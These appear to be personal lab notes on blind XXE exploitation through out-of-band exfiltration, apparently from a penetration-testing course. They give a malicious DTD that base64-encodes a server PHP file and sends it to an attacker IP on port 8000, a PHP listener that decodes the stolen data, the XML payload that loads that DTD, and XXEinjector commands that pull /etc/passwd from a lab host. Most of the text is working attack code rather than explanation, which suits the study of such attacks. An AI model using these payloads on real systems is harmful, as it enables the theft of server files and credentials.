{"uid":"52","username":"a.corrales","full_name":"Amor Corrales","company":"Administrator"}

when we cannot see the output of any XML entities nor do we get any PHP errors displayed

Out of Band Data Exfiltration  -> hosted DTD file in our machine and made the web application connect to us 

make a dtd file and then host it
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/327a6c4304ad5938eaf0efb6cc3e53dc.php">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://10.10.14.79:8000/?content=%file;'>">
```


PHP script
automatically detects encoded file content, decodes it, and outputs it to the terminal 
```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

host it on our server
```
php -S 0.0.0.0:8000
```

then we do this
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

## Automated
```shell-session
git clone https://github.com/enjoiz/XXEinjector.git
```

we take the HTTP request from burp and then write XXEINJECT after the position locator
```
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```


```shell-session
ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```

then we read the logs: 

```shell-session
cat Logs/10.129.201.94/etc/passwd.log 
```